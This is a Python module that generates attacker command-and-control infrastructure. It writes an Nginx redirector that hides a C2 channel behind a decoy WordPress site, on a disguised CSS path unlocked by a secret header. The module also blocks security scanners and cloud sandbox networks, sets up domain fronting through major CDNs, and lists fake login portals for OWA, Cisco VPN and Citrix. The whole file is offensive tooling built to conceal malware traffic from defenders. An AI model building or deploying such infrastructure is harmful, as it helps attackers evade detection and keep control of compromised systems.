import os
import time
import hashlib
import random
import string
from typing import List, Dict, Tuple, Optional, Callable


class C2Redirector:
    """
    3-tier architecture for infrastructure hardening:
    - Layer 1: Legitimate website (Nginx reverse proxy + Decoy)
    - Layer 2: Sinkhole domain (Failover / Sandbox trap)
    - Layer 3: Real C2 Infrastructure
    """

    def __init__(self, layers: Optional[List[Dict]] = None):
        self.layers = layers or [
            {
                "name": "edge_proxy",
                "type": "nginx",
                "url": "https://cdn.legit-service.com",
                "status": "healthy",
                "decoy": "wordpress"
            },
            {
                "name": "sinkhole",
                "type": "failover",
                "url": "https://analytics.sec-tracker.net",
                "status": "healthy"
            },
            {
                "name": "core_c2",
                "type": "c2",
                "url": "https://api.internal-sync.io",
                "status": "healthy"
            }
        ]
        self.current_layer = 0
        self.geofencing_enabled = True
        self.allowed_countries = ["US", "GB", "DE", "FR", "JP"]
        self.blocked_asn = [15169, 16509, 14618] # Google, Amazon, DigitalOcean (common sandbox/scanner IPs)

    def generate_nginx_config(self, decoy_type: str = "wordpress") -> str:
        """
        Generate military-grade Nginx configuration:
        - Decoy site integration
        - Header-based proxying (Malleable C2)
        - IP Geofencing (simulated)
        - Anti-Analysis/Scraping
        """
        c2_header = "X-Sync-Token"
        c2_secret = hashlib.sha256(os.urandom(32)).hexdigest()[:16]
        
        config = f"""
# APT-Grade C2 Redirector Configuration
worker_processes auto;
events {{ worker_connections 1024; }}

http {{
    include /etc/nginx/mime.types;
    default_type application/octet-stream;
    
    # Hide Nginx Version
    server_tokens off;
    
    # GeoIP Geofencing (requires ngx_http_geoip_module)
    # geoip_country /usr/share/GeoIP/GeoIP.dat;
    # map $geoip_country_code $allowed_country {{
    #     default no;
    #     US yes; GB yes; DE yes;
    # }}

    upstream backend_c2 {{
        server {self.layers[2]['url'].replace('https://', '')}:443;
        keepalive 32;
    }}

    server {{
        listen 443 ssl http2;
        server_name {self.layers[0]['url'].replace('https://', '')};

        ssl_certificate /etc/letsencrypt/live/legit-service.com/fullchain.pem;
        ssl_certificate_key /etc/letsencrypt/live/legit-service.com/privkey.pem;
        ssl_protocols TLSv1.2 TLSv1.3;
        ssl_ciphers HIGH:!aNULL:!MD5;

        # Decoy Site (WordPress)
        root /var/www/html;
        index index.php index.html;

        location / {{
            try_files $uri $uri/ /index.php?$args;
        }}

        # C2 Communication Channel (Hidden)
        location /wp-includes/css/wp-embed-tiny.min.css {{
            # Only proxy if the secret header is present
            if ($http_{c2_header.lower().replace('-', '_')} != "{c2_secret}") {{
                return 404;
            }}

            proxy_pass https://backend_c2;
            proxy_set_header Host $host;
            proxy_set_header X-Real-IP $remote_addr;
            proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
            
            # Mask C2 Traffic
            proxy_hide_header X-Powered-By;
            proxy_hide_header Server;
        }}

        # Block common security scanners
        if ($http_user_agent ~* (nmap|nikto|qualys|nessus|censys|shodan)) {{
            return 444;
        }}
    }}
}}
"""
        return config.strip()

    def get_active_endpoint(self) -> str:
        """
        Returns the current healthy layer URL
        """
        return self.layers[self.current_layer]["url"]

    def rotate_layer(self):
        """
        Rotate to next layer if current is compromised
        """
        self.current_layer = (self.current_layer + 1) % len(self.layers)
        return self.get_active_endpoint()


class DomainFronting:
    """
    Hiding C2 traffic behind high-reputation CDN domains
    """
    def __init__(self):
        self.fronting_providers = {
            "azure": "ajax.aspnetcdn.com",
            "cloudflare": "cdnjs.cloudflare.com",
            "cloudfront": "d3c33hcgiwev3.cloudfront.net",
            "google": "www.google.com"
        }

    def get_fronting_config(self, provider: str = "cloudflare") -> Dict:
        """
        Generate Host header and SNI for domain fronting
        """
        sni = self.fronting_providers.get(provider, "www.google.com")
        return {
            "sni": sni,
            "host_header": "c2-backend.internal-api.net", # Real hidden C2
            "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "tls_version": "TLSv1.3"
        }


class DecoyServices:
    """
    Management of legitimate-looking services on the redirector
    """
    @staticmethod
    def get_service_templates() -> Dict[str, str]:
        return {
            "wordpress": "Standard WordPress 6.x installation with legitimate plugins",
            "owa": "Outlook Web Access 2019 login portal",
            "vpn": "Cisco AnyConnect VPN Client portal",
            "citrix": "Citrix Gateway login page"
        }

    @staticmethod
    def generate_dummy_data() -> List[Dict]:
        """Generate realistic database entries for decoys"""
        users = []
        for _ in range(10):
            first = random.choice(["John", "Jane", "Robert", "Mary", "David", "Linda"])
            last = random.choice(["Smith", "Johnson", "Williams", "Brown", "Jones"])
            users.append({
                "username": f"{first.lower()}.{last.lower()}",
                "email": f"{first.lower()}.{last.lower()}@legit-service.com",
                "role": random.choice(["editor", "subscriber", "author"])
            })
        return users
